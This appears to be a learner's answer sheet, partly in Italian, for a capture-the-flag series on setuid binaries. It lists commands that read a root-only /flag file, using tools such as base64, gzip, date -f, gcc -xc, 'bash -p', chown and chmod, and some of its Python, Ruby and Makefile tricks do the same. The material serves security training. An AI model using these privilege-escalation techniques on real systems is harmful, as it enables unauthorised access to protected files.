LVL 1
cat /flag

LVL 2
more /flag

LVL 3
less /flag

LVL 4
tail /flag

LVL 5
head /flag

LVL 6
sort /flag

LVL 7
vim /flag

LVL 8
emacs /flag

LVL 9
nano /flag

LVL 10
rev /flag | rev

LVL 11
od -An -c /flag
(Poi copi-incolli su vscode, ctrl+f, replace all degli spazi con stringa vuota e ottieni flag)

LVL 12
hd /flag
(poi la ricostruisci tu)

LVL 13
xxd /flag | xxd -r

LVL 14
base32 /flag | base32 -d

LVL 15
base64 /flag | base64 -d

LVL 16
split /flag
cat xaa

LVL 17
gzip /flag
gzip -dc flag.gz

LVL 18
bzip2 /flag
bzip2 -dc flag.bz2

LVL 19
zip flag.zip /flag
cat flag.zip

LVL 20
tar -cf flag.tar /flag
cat flag.tar

LVL 21
ar -r archive.a /flag

LVL 22


...

LVL 30
setarch $(uname -m) /bin/cat /flag

LVL 31
watch -x cat /flag

LVL 37
chown hacker /flag
cat flag

LVL 38
chmod a+r /flag
cat /flag

LVL 40
mv /flag /bin/mv
cd /challenge
./babysetuid_level40
cat mv

LVL 41
perl -pe '$_ .= "\n"' /flag

LVL 42
### script.py ###

with open('/flag', 'r') as f:
    print(f.read())

#################
python script.py

LVL 43
### script.rb ###

File.open('/flag', 'r') do |f|
    puts f.read
  end

#################
ruby script.rb

LVL 44
bash -p
cat /flag

LVL 45
date -f /flag

LVL 46
dmesg -F /flag

LVL 47
wc --files0-from=/flag

LVL 48

gcc -xc /flag

LVL 49
as /flag

-------- Parole chiave --------
print
char
file
stdout
output
string
execute
example

HARD TO REMEMBER:
-gzip /flag > archive.gz
    gzip -dc archive.gz
-find -exec cat /flag \;
-genisoimage -sort /flag
-touch file.txt && socat /flag FILE:file.txt
-awk '{print $0}' /flag
-perl -nE 'say /(.+)$/' /flag
-gcc -xc /flag
-touch makefile
    file := /flag
    variable := $(shell cat ${file})
    make -p | grep 'pwn'
